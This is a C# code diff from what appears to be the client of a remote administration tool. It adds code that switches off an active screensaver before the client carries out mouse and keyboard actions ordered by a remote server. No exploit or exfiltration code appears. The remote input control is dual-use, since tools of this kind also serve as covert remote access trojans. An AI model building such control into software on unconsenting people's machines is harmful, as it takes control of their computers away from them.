@@ -112,6 +112,19 @@ namespace xClient.Core.Commands
                 int offsetY = allScreens[command.MonitorIndex].Bounds.Y;
                 Point p = new Point(command.X + offsetX, command.Y + offsetY);
 
+                // Disable screensaver if active before input
+                switch (command.Action)
+                {
+                    case MouseAction.LeftDown:
+                    case MouseAction.LeftUp:
+                    case MouseAction.RightDown:
+                    case MouseAction.RightUp:
+                    case MouseAction.MoveCursor:
+                        if (NativeMethodsHelper.IsScreensaverActive())
+                            NativeMethodsHelper.DisableScreensaver();
+                        break;
+                }
+
                 switch (command.Action)
                 {
                     case MouseAction.LeftDown:
@@ -140,6 +153,9 @@ namespace xClient.Core.Commands
 
         public static void HandleDoKeyboardEvent(Packets.ServerPackets.DoKeyboardEvent command, Client client)
         {
+            if (NativeMethodsHelper.IsScreensaverActive())
+                NativeMethodsHelper.DisableScreensaver();
+
             NativeMethodsHelper.DoKeyPress(command.Key, command.KeyDown);
         }
 
